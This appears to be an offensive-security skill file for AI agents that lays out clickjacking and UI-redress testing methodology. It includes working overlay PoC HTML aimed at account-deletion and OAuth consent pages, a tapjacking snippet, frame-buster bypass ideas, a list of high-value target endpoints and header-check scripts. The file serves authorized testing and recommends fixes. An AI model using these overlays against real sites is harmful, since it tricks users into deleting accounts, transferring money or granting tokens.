---
name: offensive-clickjacking
description: "Clickjacking and UI redress attack methodology — iframe overlay attacks, transparent layer techniques, drag-and-drop interaction hijacking, double-click exploitation, cursor-jacking, X-Frame-Options and CSP frame-ancestors bypass research, click amplification chains (CSRF + clickjacking, OAuth consent hijacking, payment confirmation hijacking), and modern same-origin-policy exceptions. Use when assessing whether sensitive single-click actions are framing-protected."
---

# Clickjacking & UI Redress

Trick the user into clicking something they can see but inside a context they don't see. Modern defaults (`X-Frame-Options: SAMEORIGIN` or CSP `frame-ancestors 'none'`) blunt the classic attack — but plenty of high-value flows still ship without framing protection.

## Quick Workflow

1. List sensitive single-click actions (delete account, transfer money, accept share, OAuth consent)
2. Test framing — does `X-Frame-Options` or CSP `frame-ancestors` block embedding?
3. If embeddable, build the overlay PoC
4. Demonstrate reliable click hijack
5. Quantify impact (what does the click cause?)

---

## Framing Protection Test

```bash
curl -sI https://target.com/account/delete | grep -iE "(x-frame|content-security)"
```

Possible outcomes:
- `X-Frame-Options: DENY` → no framing
- `X-Frame-Options: SAMEORIGIN` → only target.com can frame
- `X-Frame-Options: ALLOW-FROM <uri>` → deprecated, ignored by Chrome
- `Content-Security-Policy: frame-ancestors 'none'` → no framing
- `frame-ancestors 'self'` → same-origin only
- `frame-ancestors target.com 'self'` → specific origins
- No header → embeddable from anywhere

If embeddable, proceed to overlay attack.

## Classic Overlay

```html
<!doctype html>
<style>
  iframe { width: 800px; height: 600px; opacity: 0.001; position: absolute; top: 0; left: 0; }
  .lure { position: absolute; top: 200px; left: 300px; }
</style>
<div class="lure">
  <button>Click here for free $$$</button>
</div>
<iframe src="https://target.com/account/delete?confirm=true"></iframe>
```

The button position is overlaid on the actual "Delete Account" button in the iframe. The user "clicks the lure," really clicking through to the framed app.

## Drag-and-Drop Hijack

For actions requiring drag (rare today but present in some workflows):

```html
<iframe src="https://target.com/share-with-attacker"></iframe>
<!-- The "drag this to share" element in the iframe is positioned where the user drags a "treasure chest" -->
```

User drags the lure → drag event hits the framed app → share triggered.

## Cursor Hijack

Show a fake cursor offset from the real one. The user clicks where they think the cursor is, but the real click lands elsewhere. Modern browsers limit `cursor: none` propagation across frames, but custom-cursor implementations in apps can still be confused.

## Frame Busting Bypass

If the app has JavaScript-based frame busting (`if (top != self) top.location = self.location`), modern attacker techniques:

- `<iframe sandbox="allow-scripts">` — disables `top` access in some configurations
- `Origin: null` exploitation
- Race the frame-buster's redirect with a beforeunload prompt

Modern frame busting is unreliable. If the only defense is JavaScript, you can usually bypass.

## High-Value Targets

| Target Action | Impact |
|---|---|
| `/account/delete-confirm` | Account loss |
| `/payments/transfer/confirm` | Financial loss |
| `/oauth/authorize` (consent screen) | Token issuance to attacker app |
| `/admin/grant-role` | Role escalation |
| `/share/<resource>?recipient=attacker` | Privacy / data exposure |
| `/integrations/connect/<provider>` | Third-party app linkage |
| `/security/disable-2fa` | MFA disablement |
| `/api/key/regenerate` | Token theft after invalidation |

## OAuth Consent Hijack

Particularly dangerous variant. OAuth consent screens are intentionally framable in some configurations.

```html
<iframe src="https://provider.com/oauth/authorize?client_id=ATTACKER_APP&scope=read:everything&redirect_uri=...&state=..."></iframe>
```

User clicks "Authorize" → attacker app gets the access token. RFC 6749 doesn't mandate framing protection on the consent screen; many providers added it later but exceptions remain.

## Likejacking / Followjacking

Same technique against social-network like / follow / share buttons. Consequences are smaller per-click but scale via amplification.

## Mobile-Specific (Tapjacking)

Android: an overlay app draws transparent UI over a sensitive in-app dialog. The user taps "OK" thinking it's the overlay; the tap goes through to the app underneath.

```java
WindowManager.LayoutParams p = new WindowManager.LayoutParams(...);
p.flags |= FLAG_NOT_TOUCHABLE | FLAG_NOT_FOCUSABLE;
// Overlay drawn via SYSTEM_ALERT_WINDOW permission
```

iOS: harder due to platform restrictions on overlays; targets are typically web apps in Safari.

## Test Tooling

```html
<!-- Burp generates a CJ test page automatically -->
<!-- Or use clickjacker -->
git clone https://github.com/Quitten/clickjacker
python3 clickjacker.py -u https://target.com/account/delete
```

## Engagement Cheatsheet

```bash
# 1. Headers per sensitive endpoint
for path in /account/delete /payment/transfer /oauth/authorize /admin/grant-role; do
  echo "=== $path ==="
  curl -sI https://target.com$path | grep -iE "(x-frame|content-security|frame-ancestors)"
done

# 2. For each missing protection, build PoC HTML; verify in browser

# 3. Test framing-protection bypass strategies if partial:
#    - Sandbox iframe (allow-scripts)
#    - Origin: null tricks
#    - JS frame-buster bypass

# 4. Document: page, current header (if any), PoC, impact
```

## Reporting

For each finding:
- The URL with no/weak framing protection
- Header(s) currently set
- The action that triggers on click
- A complete embeddable HTML PoC
- The impact in business terms (account loss, money transfer, etc.)
- Recommended fix: `Content-Security-Policy: frame-ancestors 'self'` (or `'none'`)

---

## Key References

- OWASP Clickjacking Defense Cheat Sheet
- "Clickjacking: Attacks and Defenses" — Stanford 2010 (foundational)
- W3C CSP frame-ancestors directive
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/clickjacking.md
